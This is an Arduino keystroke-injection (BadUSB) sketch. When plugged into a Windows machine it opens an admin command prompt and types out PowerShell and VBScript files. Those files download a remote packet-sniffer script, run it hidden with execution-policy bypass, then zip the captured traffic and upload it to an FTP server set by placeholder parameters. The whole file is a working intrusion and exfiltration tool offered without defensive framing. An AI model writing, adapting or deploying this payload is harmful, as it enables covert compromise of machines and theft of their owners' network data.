void setup()
{
  Keyboard.begin();
}

void loop(){
delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println(F("echo $webclient = New-Object System.Net.WebClient > %temp%\\download.ps1"));
  Keyboard.println(F("echo $url = \"INPUT0\" >> %temp%\\download.ps1"));
  Keyboard.println(F("echo $file = \"%temp%\\sniffer.ps1\" >> %temp%\\download.ps1"));
  Keyboard.println(F("echo $webclient.DownloadFile($url,$file) >> %temp%\\download.ps1"));
  
  Keyboard.println(F("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\download.vbs"));
  Keyboard.println(F("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\download.ps1\"),0,true >> %temp%\\download.vbs"));
  delay(1000);
  Keyboard.println(F("wscript %temp%\\download.vbs"));
  delay(5000);
  
  Keyboard.println(F("echo Start-Sleep -Seconds INPUT1 >> %temp%\\sniffer.ps1"));
  Keyboard.println(F("echo $now = Get-Date >> %temp%\\sniffer.ps1"));
  Keyboard.println(F("echo $zipfile = $now.ToUniversalTime().ToString(\"dd_MM_yyyy_HH_mm_ss\") >> %temp%\\sniffer.ps1"));
  Keyboard.println(F("echo Zip \"$env:temp\\$zipfile.zip\" \"$env:temp\\packets.txt\" >> %temp%\\sniffer.ps1"));
  Keyboard.println(F("echo Start-Sleep -seconds 5 >> %temp%\\sniffer.ps1"));
  Keyboard.println(F("echo $ftp = \"ftp://INPUT2:INPUT3@INPUT4/$zipfile.zip\" >> %temp%\\sniffer.ps1"));
  Keyboard.println(F("echo $webclient = New-Object System.Net.WebClient >> %temp%\\sniffer.ps1"));
  Keyboard.println(F("echo $uri = New-Object System.Uri($ftp) >> %temp%\\sniffer.ps1"));
  Keyboard.println(F("echo $zipfile >> %temp%\\sniffer.ps1"));
  Keyboard.println(F("echo $webclient.UploadFile($uri, \"$env:temp\\$zipfile.zip\") >> %temp%\\sniffer.ps1"));
  Keyboard.println(F("echo } >> %temp%\\sniffer.ps1"));
  delay(2000);
  Keyboard.println(F("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\sniffer.vbs"));
  Keyboard.println(F("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\sniffer.ps1\"),0,true >> %temp%\\sniffer.vbs"));
  delay(1000);
  Keyboard.println(F("wscript %temp%\\sniffer.vbs"));
  delay(5000);
  
  Keyboard.println(F("exit"));
  while(true);
}

DEFS
